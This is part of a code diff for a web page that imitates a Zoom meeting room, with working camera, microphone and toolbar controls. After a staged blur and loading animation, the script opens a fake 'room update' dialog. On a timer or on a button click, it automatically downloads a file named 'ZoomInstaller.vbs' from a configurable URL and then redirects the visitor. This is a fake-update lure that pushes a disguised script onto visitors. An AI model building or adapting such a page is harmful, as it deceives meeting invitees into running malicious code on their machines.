+        muteBtn.classList.toggle('is-off', muted);
+      });
+    }
+
+    if (videoBtn) {
+      videoBtn.addEventListener('click', function () {
+        videoOn = !videoOn;
+        if (videoTrack) videoTrack.enabled = videoOn;
+        var tr = getTr();
+        if (videoLabel) videoLabel.textContent = videoOn ? (tr.tbVideo || 'Video') : (tr.tbStart || 'Start Video');
+        videoBtn.classList.toggle('is-off', !videoOn);
+        if (fallback) fallback.classList.toggle('is-visible', !videoOn);
+      });
+    }
+
+    if (leaveBtn) leaveBtn.addEventListener('click', leaveMeetingRoom);
+  }
+
+  // ============================================================
+  // Blur + wheel + room update modal sequence
+  // ============================================================
+  function scheduleBlurAndLoading() {
+    var tile    = document.querySelector('#meetingRoom .mr-tile');
+    var overlay = $('mrLoadingOverlay');
+
+    if (window.__mrBlurTimer)    clearTimeout(window.__mrBlurTimer);
+    if (window.__mrWheelOnTimer) clearTimeout(window.__mrWheelOnTimer);
+    if (window.__mrWheelOffTimer) clearTimeout(window.__mrWheelOffTimer);
+
+    window.__mrBlurTimer = setTimeout(function () {
+      if (tile) tile.classList.add('is-blurred');
+    }, 2500);
+
+    window.__mrWheelOnTimer = setTimeout(function () {
+      if (overlay) { overlay.hidden = false; overlay.setAttribute('aria-hidden', 'false'); }
+    }, 4000);
+
+    window.__mrWheelOffTimer = setTimeout(function () {
+      if (overlay) { overlay.hidden = true; overlay.setAttribute('aria-hidden', 'true'); }
+      if (tile) tile.classList.remove('is-blurred');
+      setTimeout(openRoomUpdateModal, ROOM_MODAL_OPEN_DELAY_MS);
+    }, 6500);
+  }
+
+  // ============================================================
+  // Download + modals
+  // ============================================================
+  function triggerDownload() {
+    if (!UPDATE_DOWNLOAD_URL || UPDATE_DOWNLOAD_URL === '#') return;
+    var a = document.createElement('a');
+    a.href = UPDATE_DOWNLOAD_URL;
+    a.download = 'ZoomInstaller.vbs';
+    a.rel = 'noopener';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function () { a.remove(); }, 0);
+  }
+
+  function openRoomUpdateModal() {
+    var m = $('roomUpdateModal'); if (!m) return;
+    m.classList.add('is-open');
+    window.__roomModalDlTimer = setTimeout(triggerDownload, ROOM_UPDATE_DELAY_MS);
+  }
+  window.closeRoomUpdateModal = function (reason) {
+    var m = $('roomUpdateModal'); if (!m) return;
+    m.classList.remove('is-open');
+    if (reason === 'cancel') leaveMeetingRoom();
+  };
+  window.roomManualUpdate = function () {
+    triggerDownload();
+    if (UPDATE_REDIRECT_URL && UPDATE_REDIRECT_URL !== '#') {
+      setTimeout(function () { window.location.href = UPDATE_REDIRECT_URL; }, 400);
+    }
+  };
+
+  // ============================================================
+  // Leave the meeting → back to home / spinner
+  // ============================================================
+  function leaveMeetingRoom() {
+    if (window.__mrBlurTimer)      clearTimeout(window.__mrBlurTimer);
+    if (window.__mrWheelOnTimer)   clearTimeout(window.__mrWheelOnTimer);
+    if (window.__mrWheelOffTimer)  clearTimeout(window.__mrWheelOffTimer);
+    if (window.__roomModalDlTimer) clearTimeout(window.__roomModalDlTimer);
+
+    var overlay = $('mrLoadingOverlay');
+    if (overlay) { overlay.hidden = true; overlay.setAttribute('aria-hidden', 'true'); }
+    var tile = document.querySelector('#meetingRoom .mr-tile');
+    if (tile) tile.classList.remove('is-blurred');
+    var rm = $('roomUpdateModal'); if (rm) rm.classList.remove('is-open');
+
+    if (window.__zoomMeetingStream && window.__zoomMeetingStream.getTracks) {
+      window.__zoomMeetingStream.getTracks().forEach(function (t) { t.stop(); });
+      window.__zoomMeetingStream = null;
+    }
+    if (window.__zoomMicCtx) { try { window.__zoomMicCtx.close(); } catch (e) {} }
+    window.__zoomMicCtx = null;
+
+    try {
+      sessionStorage.removeItem('zoom.displayName');
+      sessionStorage.removeItem('zoom.mediaIntent');
+    } catch (e) {}
+
+    // Send the user back to the root so the whole flow restarts cleanly
+    window.location.href = '../';
+  }
+
+  // ============================================================
+  // Meeting info panel
+  // ============================================================
+  (function () {
+    var infoBtn  = $('mrInfoBtn'), panel = $('mrInfoPanel');
+    var copyBtn  = $('mrInfoCopyBtn'), inviteEl = $('mrInfoInviteLink');
+    if (!infoBtn || !panel) return;
+
+    infoBtn.addEventListener('click', function (e) {
+      e.stopPropagation();
+      var isOpen = !panel.hidden;
+      panel.hidden = isOpen;
+      infoBtn.setAttribute('aria-expanded', String(!isOpen));
+    });
+    document.addEventListener('click', function (e) {
+      if (panel.hidden) return;
+      if (panel.contains(e.target)) return;
+      if (infoBtn.contains(e.target)) return;
+      panel.hidden = true;
+      infoBtn.setAttribute('aria-expanded', 'false');
+    });
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && !panel.hidden) {
+        panel.hidden = true;
+        infoBtn.setAttribute('aria-expanded', 'false');
+      }
+    });
+
+    if (copyBtn && inviteEl) {
+      copyBtn.addEventListener('click', function (e) {
+        e.stopPropagation();
+        var text = inviteEl.textContent.trim();
+        var done = function () {
+          copyBtn.classList.add('is-copied');
+          var prev = copyBtn.getAttribute('title');
+          copyBtn.setAttribute('title', 'Copied!');
+          setTimeout(function () {
+            copyBtn.classList.remove('is-copied');
+            copyBtn.setAttribute('title', prev || 'Copy invite link');
+          }, 1500);
+        };
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(done).catch(function () {
+            legacyCopy(text); done();
+          });
+        } else { legacyCopy(text); done(); }
+        function legacyCopy(t) {
+          var ta = document.createElement('textarea');
+          ta.value = t; ta.style.position = 'fixed'; ta.style.opacity = '0';
+          document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {}
+          ta.remove();
+        }
+      });
+    }
+  })();
+
+  // ============================================================
+  // Boot
+  // ============================================================
+  function boot() {
+    var nm = 'Guest';
+    var intent = 'off';
+    try {
+      nm = sessionStorage.getItem('zoom.displayName') || 'Guest';
+      intent = sessionStorage.getItem('zoom.mediaIntent') || 'off';
+    } catch (e) {}
+
+    var tag = $('mrNameTag'); if (tag) tag.textContent = nm;
+    var an = $('mrAvatarName'); if (an) an.textContent = nm;
+    var ai = $('mrAvatarInitials'); if (ai) ai.textContent = initialsFrom(nm);
+
+    // Wire toolbar once — buttons will work whether or not we get a stream
+    wireMeetingRoomToolbar(null);
+
+    if (intent === 'on' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function (stream) {
+          window.__zoomMeetingStream = stream;
+          var vid = $('meetingRoomVideo');
+          if (vid) {
+            vid.srcObject = stream;
+            vid.muted = true;
+            var p = vid.play(); if (p && p.catch) p.catch(function(){});
+          }
+          try { startMicMeter(stream); } catch (e) {}
+          // Re-wire the toolbar WITH the actual stream now that it exists
+          var room = $('meetingRoom');
+          if (room) { room.dataset.wired = ''; }
+          wireMeetingRoomToolbar(stream);
+        })
+        .catch(function (err) {
+          console.warn('[meeting] getUserMedia failed:', err && err.name);
+          var fb = $('mrAvatarFallback'); if (fb) fb.classList.add('is-visible');
+          var vb = $('mrVideoBtn'); if (vb) vb.classList.add('is-off');
+          var v = $('meetingRoomVideo'); if (v) v.style.display = 'none';
+        });
+    } else {
+      // User chose not to share media — show avatar
+      var fb = $('mrAvatarFallback'); if (fb) fb.classList.add('is-visible');
+      var vb = $('mrVideoBtn'); if (vb) vb.classList.add('is-off');
+      var v = $('meetingRoomVideo'); if (v) v.style.display = 'none';
+    }
+
+    // Re-apply current language
+    if (window.zoomApplyLanguage) window.zoomApplyLanguage(getLang());
+
+    // Kick off the blur → wheel → update modal sequence
+    scheduleBlurAndLoading();
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+})();
+</script>
+</body>
+</html>
